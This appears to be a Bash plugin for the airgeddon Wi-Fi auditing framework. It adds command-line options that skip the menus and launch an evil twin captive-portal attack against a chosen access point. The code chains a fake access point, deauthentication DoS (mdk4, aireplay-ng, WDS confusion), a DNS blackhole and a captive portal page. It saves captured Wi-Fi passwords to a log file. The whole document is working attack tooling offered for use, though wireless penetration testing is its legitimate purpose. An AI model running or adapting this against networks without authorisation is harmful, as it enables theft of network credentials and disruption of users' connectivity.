#!/usr/bin/env bash

#Global shellcheck disabled warnings
#shellcheck disable=SC2034,SC2154

plugin_name="Airgeddon CLI"
plugin_description="Plugin to use cli parameters to skip menu and start evil twin attack."
plugin_author="xpz3"

plugin_enabled=1

plugin_minimum_ag_affected_version="11.31"
plugin_maximum_ag_affected_version=""

plugin_distros_supported=("*")

AIRGEDDON_DEVELOPMENT_MODE="true" # Do not change this value

airgeddon_cli_targets_default_path="" #Default value set from a function below(Default path would be set as <airgeddon_directory>/plugins/captured_handshakes/targets/). Can use a custom value here
airgeddon_cli_tmux_active=0
airgeddon_cli_active=1
airgeddon_cli_skip=1

#Default Values
airgeddon_cli_arguments_copy="$@"
airgeddon_cli_filemode=0
et_dos_attack="Aireplay" #Default DoS attack is aireplay-ng
advanced_captive_portal=0 #Advanced captive portal is disabled by default
captive_portal_language="ENGLISH" #Default captive portal language
dos_pursuit_mode=0 #DoS pursuit mode turned off by default

function airgeddon_cli_print_usage() {

	debug_print

	echo
	echo $'bash' "${scriptname}"$' [-a|-advportal|--advportal] [-b|-bssid|--bssid <bssid>] [-c|-channnel|--channel <channel>]\n\t[-cl|--cl <captive portal password log path>] [-d|-debug|--debug] [-dos|--dos <DoS mode>]\n\t[-e|-essid|--essid <essid>] [-enc|--enc <encryption type>] [-f|-file|--file <filename>]\n\t[-h|-hsfile|--hsfile <handshakefilepath>] [-i|-interface|--interface <interface>]\n\t[-l|-cplang|--cplang <captive portal language>] [-m|-ms|--ms] [-nk|--nk]\n\t[-p|-dp|--dp <DoS pursuit interface>] [-t|-tmux|--tmux] [-u|-usage|--usage] [-v|-version|--version]'
	echo
	echo $'\t[-a|-advportal|--advportal]\n\t\tEnable advanced captive portal'
	echo $'\t[-b|-bssid|--bssid <bssid>]\n\t\tSpecify target bssid'
	echo $'\t[-c|-channnel|--channel <channel>\n\t\tSpecify target channel'
	echo $'\t[-cl|--cl <captive portal password log path>]\n\t\tSpecify captive portal password save path on successful capture'
	echo $'\t[-d|-debug|--debug]\n\t\tSet AIRGEDDON_DEBUG_MODE=true'
	echo $'\t[-dos|--dos <DoS mode>]\n\t\tSpecify DoS attack option: 1=mkd4|mkd3 2=Aireplay-ng 3=WDS Confusion'
	echo $'\t[-e|-essid|--essid <essid>]\n\t\tSpecify target essid'
	echo $'\t[-enc|--enc <encryption type>]\n\t\tSpecify target AP encryption {WPA|WPA2}'
	echo $'\t[-f|-file|--file <filepath>]\n\t\tSpecify the filename containing target AP essid,bssid,channel,encryption and handshake file path delimited by "|" character. If this option is used, the values from the file will override any other values specified by command line.'
	echo $'\t[-h|-hsfile|--hsfile <handshakefilepath>]\n\t\tSpecify the location of target AP handshake file'
	echo $'\t[-i|-interface|--interface <interface>]\n\t\tSpecify the interface for captive portal attack. The interface must support VIF and MUST be in Managed mode before starting airgeddon'
	echo $'\t[-l|-cplang|--cplang <captive portal language>]\n\t\tSpecify the language to be used on captive portal. Default is ENGLISH'
	echo $'\t[-m|-ms|--ms]\n\t\tEnable mac address spoofing'
	echo $'\t[-nk|--nk]\n\t\tSet AIRGEDDON_FORCE_NETWORK_MANAGER_KILLING=false'
	echo $'\t[-p|-dp|--dp <DoS pursuit interface>]\n\t\tEnable DoS pursuit mode. Specify the second interface name'
	echo $'\t[-t|-tmux|--tmux]\n\t\tSet AIRGEDDON_WINDOWS_HANDLING=tmux and start airgeddon inside tmux'
	echo $'\t[-v|-version|--version]\n\t\tPrints airgeddon version'
	echo $'\t[-u|-usage|--usage]\n\t\tPrints usage'
}
function airgeddon_cli_get_absolute_script_path() {

	debug_print

	if [ "${0}" != "${scriptname}" ];then
		airgeddon_cli_relative_path=$(pwd)
		cd "${airgeddon_cli_relative_path}"
		cd "${0%/*}"
		airgeddon_cli_absolute_script_path=$(pwd)
	else
		airgeddon_cli_absolute_script_path=$(pwd)
	fi
}

function airgeddon_cli_manage_captive_portal_log() {

	debug_print

	default_et_captive_portal_logpath="${default_save_path}"
	default_et_captive_portallogfilename="evil_twin_captive_portal_password-${essid}.txt"
	default_et_captive_portal_logpath="${default_et_captive_portal_logpath}${default_et_captive_portallogfilename}"
	validpath=1
}

function airgeddon_cli_override_exec_et_captive_portal_attack() {

	debug_print

	rm -rf "${tmpdir}${webdir}" > /dev/null 2>&1
	mkdir "${tmpdir}${webdir}" > /dev/null 2>&1

	set_hostapd_config
	launch_fake_ap
 	set_network_interface_data
	set_dhcp_config
	set_std_internet_routing_rules
	launch_dhcp_server
	exec_et_deauth
	set_et_control_script
	launch_et_control_window
	launch_dns_blackhole
	prepare_captive_portal_data
	set_webserver_config
	set_captive_portal_page
	launch_webserver
	write_et_processes

	echo
	language_strings "${language}" 298 "yellow"
	language_strings "${language}" 115 "read"

	kill_et_windows

	if [ "${dos_pursuit_mode}" -eq 1 ]; then
		recover_current_channel
	fi

	restore_et_interface
	clean_tmpfiles
}

function airgeddon_cli_read_target_values() {

	debug_print

	local airgeddon_cli_values_from_file=""
	read -r airgeddon_cli_values_from_file < "${airgeddon_cli_targets_default_path}${airgeddon_cli_target_file}"

	essid=$(echo "${airgeddon_cli_values_from_file}" | awk '{split($0, airgeddon_cli_target_values,"|"); print airgeddon_cli_target_values[1]}')
	bssid=$(echo "${airgeddon_cli_values_from_file}" | awk '{split($0, airgeddon_cli_target_values,"|"); print airgeddon_cli_target_values[2]}')
	channel=$(echo "${airgeddon_cli_values_from_file}" | awk '{split($0, airgeddon_cli_target_values,"|"); print airgeddon_cli_target_values[3]}')
	enc=$(echo "${airgeddon_cli_values_from_file}" | awk '{split($0, airgeddon_cli_target_values,"|"); print airgeddon_cli_target_values[4]}')
	et_handshake=$(echo "${airgeddon_cli_values_from_file}" | awk '{split($0, airgeddon_cli_target_values,"|"); print airgeddon_cli_target_values[5]}')
}
function airgeddon_cli_verify_parameters(){

	debug_print

	if [[ "${airgeddon_cli_tmux_active}" -eq 1 ]];then
		return
	fi
	if ! [[ "${bssid}" =~ ^([[:xdigit:]]{2}[:]){5}([[:xdigit:]]{2})$ ]];then
		echo "Invalid BSSID. Quitting..."
		exit
	fi
	if [[ -z "${essid}" ]] || [[ -z "${channel}" ]] || [[ -z "${enc}" ]];then
		echo "Invalid ESSID/Channel/Encryption. Quitting..."
		exit
	fi
	
	if [[ -z "${interface}" ]];then
		echo "No interface selected. Quitting..."
		exit
	else
		local airgeddon_cli_interface_mode=$(iw "${interface}" info 2> /dev/null | grep type | awk '{print $2}')
		if [[ "${airgeddon_cli_interface_mode^}" != "Managed" ]];then
			echo "The selected interface MUST be in Managed mode. Quitting..."
			exit
		fi
	fi
	if [ "${et_handshake}" = "" ];then
		echo "Handshake file not specified. Quitting..."
		exit
	fi
}

function airgeddon_cli_parse_parameters(){

	debug_print

	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ];then
		transfer_to_tmux "${airgeddon_cli_arguments_copy}"
		if ! check_inside_tmux; then
			exit_code=1
			exit ${exit_code}
		fi
	fi
	airgeddon_cli_get_absolute_script_path
	airgeddon_cli_verify_parameters
	airgeddon_cli_manage_captive_portal_log
	et_captive_portal_logpath="${default_et_captive_portal_logpath}"

	et_mode="et_captive_portal"
	ifacemode="Managed"

	check_interface_supported_bands "${phy_interface}" "main_wifi_interface"
	language_strings "${language}" 101 "title"
	print_iface_selected
	print_all_target_vars
	echo
	language_strings "${language}" 296 "yellow"
	exec_et_captive_portal_attack
	evil_twin_attacks_menu
	airgeddon_cli_active=0
	airgeddon_cli_skip=1
	main_menu
}

function airgeddon_cli_override_select_interface(){

	debug_print

	if [[ "${airgeddon_cli_active}" == 1 ]] && [[ "${airgeddon_cli_skip}" == 0 ]];then
		return
	else
		local interface_menu_band

		clear
		language_strings "${language}" 88 "title"
		current_menu="select_interface_menu"
		language_strings "${language}" 24 "green"
		print_simple_separator
		ifaces=$(ip link | grep -E "^[0-9]+" | cut -d ':' -f 2 | awk '{print $1}' | grep -E "^lo$" -v)
		option_counter=0
		for item in ${ifaces}; do
			option_counter=$((option_counter + 1))
			if [ ${#option_counter} -eq 1 ]; then
				spaceiface="  "
			else
				spaceiface=" "
			fi
			echo -ne "${option_counter}.${spaceiface}${item} "
			set_chipset "${item}"
			if [ "${chipset}" = "" ]; then
				language_strings "${language}" 245 "blue"
			else
				interface_menu_band=""
				if check_interface_wifi "${item}"; then
					interface_menu_band+="${blue_color}// ${pink_color}"
					get_5ghz_band_info_from_phy_interface "$(physical_interface_finder "${item}")"
					case "$?" in
						"1")
							interface_menu_band+="${band_24ghz}"
						;;
						*)
							interface_menu_band+="${band_24ghz}, ${band_5ghz}"
						;;
					esac
				fi

				if [ "${is_rtl_language}" -eq 1 ]; then
					echo -e "${interface_menu_band} ${blue_color}// ${normal_color}${chipset} ${yellow_color}:Chipset${normal_color}"
				else
					echo -e "${interface_menu_band} ${blue_color}// ${yellow_color}Chipset:${normal_color} ${chipset}"
				fi
			fi
		done
		print_hint ${current_menu}

		read -rp "> " iface
		if [[ ! ${iface} =~ ^[[:digit:]]+$ ]] || (( iface < 1 || iface > option_counter )); then
			invalid_iface_selected
		else
			option_counter2=0
			for item2 in ${ifaces}; do
				option_counter2=$((option_counter2 + 1))
				if [ "${iface}" = "${option_counter2}" ]; then
					interface=${item2}
					phy_interface=$(physical_interface_finder "${interface}")
					check_interface_supported_bands "${phy_interface}" "main_wifi_interface"
					interface_mac=$(ip link show "${interface}" | awk '/ether/ {print $2}')
					if ! check_vif_support; then
						card_vif_support=0
					else
						card_vif_support=1
					fi
					check_interface_wifi_longname "${interface}"
					break
				fi
			done
		fi
	fi
}

function airgeddon_cli_prehook_main_menu(){

	debug_print
	if [ "${airgeddon_cli_skip}" = 0 ];then
		if [ "${airgeddon_cli_active}" -eq 1 ];then
			airgeddon_cli_parse_parameters
		fi
	fi
}

function airgeddon_cli_override_start_airgeddon_from_tmux() {

	debug_print

	tmux rename-window -t "${session_name}" "${tmux_main_window}"
	tmux send-keys -t "${session_name}:${tmux_main_window}" "clear;cd ${scriptfolder};bash ${scriptname} true ${airgeddon_uid}" ENTER
 	sleep 0.2
	if [ "${1}" = "normal" ]; then
		tmux attach -t "${session_name}"
	else
		tmux switch-client -t "${session_name}"
	fi
}

function airgeddon_cli_override_create_tmux_session() {

	debug_print

	session_name="${1}"

	if [ "${2}" = "true" ]; then
		tmux new-session -d -s "${1}"
		start_airgeddon_from_tmux "normal" "${3}"
	else
		tmux new-session -d -s "${1}"
		start_airgeddon_from_tmux "nested" "${3}"
	fi
}

function airgeddon_cli_override_transfer_to_tmux() {

	debug_print

	if ! check_inside_tmux; then
		create_tmux_session "${session_name}" "true" "${1}"
	else
		local active_session
		active_session=$(tmux display-message -p '#S')
		if [ "${active_session}" != "${session_name}" ]; then
			tmux_error=1
		fi
	fi
}

if [ "$#" -gt 0 ];then
	airgeddon_cli_skip=0
	if [[ $(ls "${scriptfolder}" | grep "${scriptname}") == "" ]];then
		airgeddon_cli_get_absolute_script_path
	else
		airgeddon_cli_absolute_script_path="${scriptfolder}"
	fi
	if [ -z "${airgeddon_cli_targets_default_path}" ];then
		airgeddon_cli_targets_default_path="${airgeddon_cli_absolute_script_path}"plugins/captured_handshakes/targets/
	fi

	if ! airgeddon_cli_arguments=$(getopt -a --options="ab:c:de:f:h:i:l:mp:tuv" \
		  --longoptions="advportal,bssid:,channel:,cplang:,cl:,debug,dos:,dp:,enc:,essid:,file:,hsfile:,interface:,ms,nk,tmux,usage,version" \
		  --name="Airgeddon v${airgeddon_version}" -- "$@"
	  ); then
	  airgeddon_cli_print_usage
	  exit
	fi

	eval set -- "$airgeddon_cli_arguments"

	while [ "$1" != "" ] && [ "$1" != "--" ]; do
	  case "$1" in
		-a|--advportal) # Enable advanced captive portal
			advanced_captive_portal=1
			;;
		-b|--bssid) # Target AP BSSID
			if [ "${airgeddon_cli_filemode}" -eq 0 ]; then
				bssid="${2}"
			fi
			shift
			;;
		-c|--channel) # Target AP Channel
			if [ "${airgeddon_cli_filemode}" -eq 0 ]; then
				channel="${2}"
			fi
			shift
			;;
		--cl) #Captive Portal password log path
			#set_default_save_path
			airgeddon_cli_manage_captive_portal_log
			et_captive_portal_logpath="${2:-$default_et_captive_portal_logpath}"
			shift
			;;
		-d|--debug) # Enable airgeddon debug mode
			AIRGEDDON_DEBUG_MODE="true"
			;;
		--dos) # DoS attack mode --> 1 = mdk4/mdk3, 2 = Aireplay, 3 = Wds Confusion
			case "${2}" in
				1)
					et_dos_attack="${mdk_command}"
					;;
				2)
					et_dos_attack="Aireplay"
					;;
				3)
					et_dos_attack="Wds Confusion"
					;;
				*)
					echo "Invalid DoS selection. Quitting..."
					exit
					;;
			esac
			shift
			;;
		-e|--essid) # Target AP ESSID
			if [ "${airgeddon_cli_filemode}" -eq 0 ]; then
				essid="${2}"
			fi
			shift
			;;
		--enc) # Target AP encryption type
			if [ "${airgeddon_cli_filemode}" -eq 0 ]; then
				enc="${2:-WPA2}"
			fi
			shift
			;;
		-f|--file) # Enable saved file mode. File name must be given
			if [ -z "${2}" ]; then
				echo "Filename cannot be empty. Quitting..."
				exit
			else
				if ! check_file_exists "${airgeddon_cli_targets_default_path}${2}"; then
					echo "File not found. Quitting..."
					exit
				fi
				airgeddon_cli_target_file="${2}"
				airgeddon_cli_filemode=1
			fi
			airgeddon_cli_read_target_values
			shift
			;;
		-h|--hsfile) # Target AP handshake file absolute path
			if [ "${airgeddon_cli_filemode}" -eq 0 ]; then
				if [ -z "${2}" ];then
					echo "No handshake file specified. Quitting..."
				fi
				et_handshake="${2}"
				if ! check_file_exists "${et_handshake}"; then
					echo "Handshake file doesn't exist. Quitting..."
					exit
				fi
				if ! check_bssid_in_captured_file "${et_handshake}" "silent" "also_pmkid"; then
					echo "BSSID and handshake file doesn't match. Quitting..."
					exit
				fi
			fi
			shift
			;;
		-i|--interface) # VIF capable interface name which MUST be in MANAGED mode
			interface="${2}"; phy_interface=$(physical_interface_finder "${interface}")
			shift
			;;
		-l|--cplang) # Captive portal language --> Case sensitive. Choose from the supported languages.
			captive_portal_language="${2:-ENGLISH}"
			shift
			;;
		-m|--ms) # Enable mac spoofing
			mac_spoofing_desired=1
			shift
			;;
		--nk) # Disable network manager killing
			AIRGEDDON_FORCE_NETWORK_MANAGER_KILLING="false"
			;;
		-p|--dp) # Enable DoS pursuit mode. Enter the name of the DoS pursuit mode interface as argument
			dos_pursuit_mode=1
			secondary_wifi_interface="${2}"
			if ! check_monitor_enabled "${secondary_wifi_interface}"; then
				echo "Trying to set monitor mode on DoS Pursuit interface..."
				if ! set_mode_without_airmon "${secondary_wifi_interface}" "monitor"; then
					echo "The interface for DoS Pursuit mode cannot be set into monitor mode. Quitting..."
					exit
				fi
			fi
			shift
			;;
		-t|--tmux) # Use tmux as window manager
			AIRGEDDON_WINDOWS_HANDLING="tmux"
			;;
		-u|--usage) # Prints airgeddon_cli usage
			airgeddon_cli_print_usage
			exit
			;;
		-v|--version) #Airgeddon current version
			if hash git 2> /dev/null; then
				airgeddon_cli_git_rev=" rev_"$(git rev-parse --short HEAD)"("$(git rev-parse --abbrev-ref HEAD)" branch)"
			fi
			echo "Airgeddon v${airgeddon_version}${airgeddon_cli_git_rev}"
			exit
			;;
	  esac
	  shift
	done
	shift
fi
